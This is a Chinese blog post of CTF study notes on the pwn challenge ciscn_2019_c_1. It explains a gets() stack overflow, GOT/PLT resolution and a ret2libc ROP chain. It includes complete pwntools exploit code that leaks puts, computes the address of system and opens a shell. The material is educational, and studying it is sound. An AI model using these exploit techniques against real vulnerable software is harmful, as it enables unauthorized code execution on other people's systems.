---
layout: post
title:  "Pwn 入门笔记 ciscn_2019_c_1"
date:   2020-07-14 12:15:38 +0800
---

# ciscn_2019_c_1

## Overview
先把程序下载下来检查下是什么情况：x86-64，有符号表，禁止从堆栈执行代码而且没有堆栈保护。
```shell
[root@VM_0_5_centos buuoj]# file ciscn_2019_c_1 
ciscn_2019_c_1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=06ddf49af2b8c7ed708d3cfd8aec8757bca82544, not stripped
[root@VM_0_5_centos buuoj]# checksec ciscn_2019_c_1 
[*] '/home/buuoj/ciscn_2019_c_1'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled  # 堆栈不可执行
    PIE:      No PIE (0x400000)
```

## Control flow
这是一个交互式的程序，先询问用户输入一个数字，根据数字的值决定后面的流程：
- 输入1执行加密`encrypt()`；
- 输入2则是一个假的解密；

接着继续询问数字，直到输入3或其他内容引起了异常而退出。至于执行加密操作的`encrypt()`函数，它首先通过`gets()`要求用户输入换行符结束的字符串，然后按照以下逻辑逐个处理并写入原处：

```python
def encrypt2(c):
    if 0x60 < c <= 0x7a:  # 26个小写英文字母
        c = c^0xD
    elif 0x40 < c <= 0x5a:  # 26个大写英文字母
        c = c^0xE
    elif 0x2f < c <= 0x39:  # 0-9
        c = c^0xF
    # 非数字和英文字母不做处理
    return c
```

## Vulnerability

使用`gets`函数有缓冲区溢出的风险，距离返回地址的距离是`0x50+0x8=0x58`个字节长度；但上述`encrypt2()`会破坏输入的payload。网上文章多数认为因为使用了异或，所以再加密一次（拼接payload后加密第一次、程序加密第二次）就能还原payload。这个看法不是十分严谨，因为两次加密之后有部分字节不能还原，可用以下代码验证：

```python
forbidden = {x for x in range(256) if x != encrypt2(encrypt2(x))}
print(f"forbidden={forbidden}")
# 输出 forbidden={115, 109, 78, 48, 49, 50, 51, 52, 53, 80, 81, 82, 83, 85, 112, 114, 118, 113}
```

看得出来，除了 `forbidden`，其它的字符都能得到还原；因此在构造payload的过程要避免上述字符。不过，其实这个程序的执行流程还存在另一个薄弱环节：

```asm
loc_400AB4:
mov     eax, cs:x       ; 全局变量x
mov     ebx, eax
lea     rax, [rbp+s]
mov     rdi, rax        ; s
call    _strlen
cmp     rbx, rax
jb      loc_4009E7      ; 仅当x小于输入内容的长度才会执行encrypt()
```

`encrypt()`函数内部是逐个处理字符的循环，结束条件是x大于等于`strlen()`；但是x是一个全局变量，每次加密之前没有被置为0。因此为了防止payload被破坏，用户有两个方法可以选择：

1. 输入两次，第二次的长度小于`strlen()`；
2. 输入内容包含`\x00`。

总结下，网上文章能成功的原因有两类，一是payload的每个字节都恰好能被还原；二是直接用`\X00`字节填充到返回地址之前，完全绕过加密逻辑。

## Leak `system()`

不像前面的题目，这里没有现成的`system("/bin/sh")`的调用，IDA的函数列表里面也木有`system`；虽然堆栈不可执行，但是因为有使用到其它libc函数，可以尝试以下办法：

1. 在libc里面找到`system()`和`/bin/sh`的地址；
2. ROP 找到用作 gadgets（有的中文书里面把这个叫做跳板）。

`system()`也是libc里面的函数。对于1，寻找`system()`地址的一般方法是：

1. 获得符号表中另一个 libc 函数的地址；
2. 查找该函数和`system()`在对应版本libc的偏移；
3. 计算装载libc的基址；
4. 计算`system()`的地址。

因为堆栈不可执行，计算地址的过程无法通过payload实现，所以需要输入两次不同的payload，第一次用来计算地址，第二次才是拉起shell。程序使用了libc的`puts()`，所以可以通过`puts()`泄露`system()`的地址。在C代码中，`puts()`的调用经过编译后对应的指令 `call <0x4006e0 >puts@plt`。这个 0x4006e0 不是`puts()`在libc中的地址，而是`puts()`的stub函数在**PLT**中的地址；`puts()`在libc中的地址实际上存储在**GOT**的0x602020处。

### GOT and PLT

libc库的内容是动态装载到进程空间的，里边的函数和变量的地址只能在运行时定位。这里涉及到GOT表(Global offset table, 全局偏移数组)和PLT表(Procedure linkage table, 过程链接表)，[外网文章](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html)十分清晰明了地讲述了Linux使用这两个数据结构调用库函数的过程。下面记录一下我对这篇文章的理解。

![GOT and PLT]({{ site.url }}/assets/2020-07-11-got_plt.png)

任何对`puts()`的调用都会跳转到 PLT。与其说PLT是一个表，不如说这是一系列stub函数的集合。stub函数的jmp指令并非直接跳转到参数所表示的地址，而是取得这个地址处存储的值并跳转。在第一次调用`puts()`时，GOT存储stub函数中jmp的下一条指令的地址，导致程序从PLT开始又跳转回到PLT；在定位出`puts()`在libc中的地址之后，程序把地址写回去GOT。后续调用`puts()`仍然需要走到PLT的stub函数，但因为真正的地址已经找到并存储在GOT，可以直接跳转而无需回到PLT。

![Resolved GOT and PLT]({{ site.url }}/assets/2020-07-11-got_plt_resolved.png)

## Payload

### Diffs between x86 and x86_64

在 x86 和 x86_64 两种架构下、ROP 方法的 payload 组织方式有所不同：
- x86 非syscall: 
  - 参数通过栈传递，因此一般无需pop和ret指令；
  - 函数能直接访问在payload中预先防止放置的数据，是因为这数据作为些参数通过ebp被访问，而ebp会在函数prologue中设置
    - prologue: `push ebp;mov ebp, esp`
    - epilogue: `leave;ret`
  - 组织形式：`FUNCTION ADDR` + `RETURN ADDR` + `ARGUMENT_0...N`
- x86_64:
  - 前6个参数依次[通过寄存器传递](https://stackoverflow.com/a/2538212/8706476)： RDI, RSI, RDX, RCX, R8, R9
  - gadget 均包含ret指令；
  - 组织形式：`FUNCTION ADDR` + `GADGET_0 ADDR` + `ARGUMENT_0` + ... + `GADGET_N ADDR` + `ARGUMENT_N` 

### Shell

为了输出`puts()`的地址，可以将`puts()`在GOT中的地址0x602020作为参数、调用`puts()`并打屏。因为amd64下参数一般通过寄存器传递，第一个参数存储在rdi，所以需要找到形如 `pop rdi;ret` 的gadgets地址去覆盖返回地址，紧跟着作为参数的0x602020(GOT)以及ret的返回地址0x4006e0(PLT)。为了能够第二次输入payload，还需要让程序正常地回到main：
```shell
ROPgadget --binary ciscn_2019_c_1 --only 'pop|ret'
# 查找 gadgets
```
```python
#!/usr/bin/python3.6
from pwn import *

elf = ELF("./ciscn_2019_c_1")
proc = process("./ciscn_2019_c_1")

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
log.info(f'puts: GOT={hex(puts_got)}; PLT={hex(puts_plt)}')

proc.sendlineafter("choice!\n", "1")
pop_rdi = 0x400c83
payload = b'\x00' * 0x58 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(elf.sym['main'])

proc.sendline(bytes(payload))

log.info(proc.recvuntil(b'Ciphertext\n'))
log.info(proc.recvuntil(b'\n'))

libc_puts = u64(proc.recvuntil(b'\n', drop=True).ljust(8, b'\x00'))
log.info(f'puts libc={hex(libc_puts)}')
```

我调试的机器是 CentOS7.7 ，使用 `LibcSearcher` 找不到`puts`为0x6b0对应的libc版本，需要先添加到[libc-database](https://github.com/niklasb/libc-database)

```shell
ldd ciscn_2019_c_1 
# libc.so.6 => /lib64/libc.so.6 (0x00007f6746632000)
python3 -m pip show LibcSearcher | grep Location
# Location: /home/LibcSearcher
cd /home/LibcSearcher/libc-database/
# cd 到LibcSearcher依赖的libc-database目录
./add /lib64/libc.so.6
./find puts 6b0
# 输出对应的libc库的id
```

计算`system()`:

```python
from LibcSearcher import *

obj = LibcSearcher("puts", libc_puts)

libc_base = libc_puts - obj.dump("puts")
libc_sys = libc_base + obj.dump("system")
libc_binsh = libc_base + obj.dump("str_bin_sh")
log.info(f'libc base={hex(libc_base)}; system={hex(libc_sys)}; /bin/sh={hex(libc_binsh)}')
```

拼接payload：

```python
proc.sendlineafter("choice!\n", "1")
payload = b'\x00' * 0x58 + p64(pop_rdi) + p64(libc_binsh) + p64(libc_sys)
proc.sendline(payload)

proc.interactive()
```

上述代码在本地CentOS7.7可以成功拉起shell，然而拉到线上就 segfault. 查阅网上资料发现这是因为Ubuntu18调用system之前会检查栈顶是否对齐16字节，要加上一个ret(相当于加8字节)去尝试。完整的代码在[这里]({{ site.url }}/assets/ciscn_2019_c_1.py)
